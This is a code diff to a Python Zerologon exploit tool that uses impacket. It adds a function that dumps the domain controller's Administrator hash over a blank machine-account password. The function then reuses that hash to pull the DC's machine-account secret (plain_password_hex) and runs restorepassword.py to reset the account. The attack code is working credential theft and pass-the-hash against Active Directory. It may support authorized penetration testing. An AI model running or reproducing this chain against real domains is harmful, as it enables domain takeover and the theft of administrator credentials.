@@ -6,9 +6,12 @@ from impacket.dcerpc.v5 import transport
 from impacket import crypto
 
 import hmac, hashlib, struct, sys, socket, time
+import re
 import subprocess
 from binascii import hexlify, unhexlify
 from subprocess import check_call
+import os
+import sys
 
 # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
 MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
@@ -144,46 +147,115 @@ def run_zerologon(dc_name, dc_ip):
         return [f"Zerologon exploit failed: {exc}"]
 
 
-def restore_machine_account_password_bloodyad(
+def _parse_admin_hash(output):
+    for line in output.splitlines():
+        if not line.lower().startswith("administrator:"):
+            continue
+        parts = line.split(":")
+        if len(parts) > 3:
+            return parts[3].strip()
+    return None
+
+
+def _parse_plain_password_hex(output):
+    for line in output.splitlines():
+        match = re.search(r"plain_password_hex\s*[:=]\s*([0-9a-fA-F]+)", line, re.IGNORECASE)
+        if not match:
+            continue
+        value = match.group(1).strip()
+        if value:
+            return value
+    return None
+
+
+def _secretsdump(command):
+    return subprocess.run(command, capture_output=True, text=True)
+
+
+def restore_machine_account_password_impacket(
     domain,
-    admin_username,
-    admin_password,
     dc_ip,
+    dc_name,
     machine_account,
-    new_password,
 ):
-    if not domain or not admin_username or not admin_password or not dc_ip:
-        return ["Missing admin credentials or domain settings."]
-    if not machine_account or not new_password:
-        return ["Missing machine account or new password."]
+    if not domain or not dc_ip or not dc_name:
+        return ["Missing domain, DC IP, or DC name."]
+    if not machine_account:
+        return ["Missing machine account."]
 
     account_name = machine_account.strip()
     if not account_name.endswith("$"):
         account_name = f"{account_name}$"
+    account_host = account_name.rstrip("$")
 
-    command = [
-        "bloodyAD",
-        "-d",
-        domain,
-        "-u",
-        admin_username,
-        "-p",
-        admin_password,
-        "-H",
-        dc_ip,
-        "set",
-        "password",
-        account_name,
-        new_password,
+    step_results = []
+
+    admin_hash_cmd = [
+        "impacket-secretsdump",
+        f"{domain}/{account_name}@{dc_ip}",
+        "-no-pass",
     ]
-
-    result = subprocess.run(command, capture_output=True, text=True)
-    if result.returncode != 0:
-        message = result.stderr.strip() or result.stdout.strip() or "Unknown error"
+    admin_hash_result = _secretsdump(admin_hash_cmd)
+    admin_hash_output = admin_hash_result.stdout or admin_hash_result.stderr
+    admin_hash = _parse_admin_hash(admin_hash_output)
+    if not admin_hash:
+        message = admin_hash_result.stderr.strip() or "Administrator hash not found."
         return [f"Restore failed: {message}"]
+    step_results.append("Administrator hash collected.")
 
-    output = result.stdout.strip() or "Machine account password restored successfully."
-    return output.splitlines() if output else ["Machine account password restored successfully."]
+    password_hex_cmd = [
+        "impacket-secretsdump",
+        f"{domain}/Administrator@{account_host}",
+        "-hashes",
+        f":{admin_hash}",
+    ]
+    password_hex_result = _secretsdump(password_hex_cmd)
+    password_hex_output = password_hex_result.stdout or password_hex_result.stderr
+    password_hex = _parse_plain_password_hex(password_hex_output)
+    if not password_hex:
+        message = password_hex_result.stderr.strip() or "plain_password_hex not found."
+        return [f"Restore failed: {message}"]
+    if len(password_hex) % 2 != 0:
+        return ["Restore failed: plain_password_hex is not valid hex (odd length)."]
+    step_results.append("Machine account password hex extracted.")
+
+    restore_script = os.path.join(
+        os.path.dirname(__file__),
+        "tools",
+        "restorepassword.py",
+    )
+    restore_cmd = [
+        sys.executable,
+        restore_script,
+        f"{domain}/{account_host}@{dc_name}",
+        "-target-ip",
+        dc_ip,
+        "-hexpass",
+        password_hex,
+    ]
+    restore_result = _secretsdump(restore_cmd)
+    restore_output = restore_result.stdout or restore_result.stderr
+    if restore_result.returncode != 0:
+        message = restore_result.stderr.strip() or "Restorepassword failed."
+        return [f"Restore failed: {message}"]
+    if restore_output.strip():
+        step_results.extend(restore_output.strip().splitlines())
+    else:
+        step_results.append("Machine account password restored.")
+
+    verify_cmd = [
+        "impacket-secretsdump",
+        f"{domain}/{account_name}@{dc_ip}",
+        "-no-pass",
+    ]
+    verify_result = _secretsdump(verify_cmd)
+    verify_output = verify_result.stdout or verify_result.stderr
+    if verify_result.returncode == 0 and "Administrator:" in verify_output:
+        step_results.append("Verification failed: machine account password is still blank.")
+    else:
+        step_results.append("Verification passed: machine account password is not blank.")
+
+    return step_results
 
 def main():
     if not (3 <= len(sys.argv) <= 4):
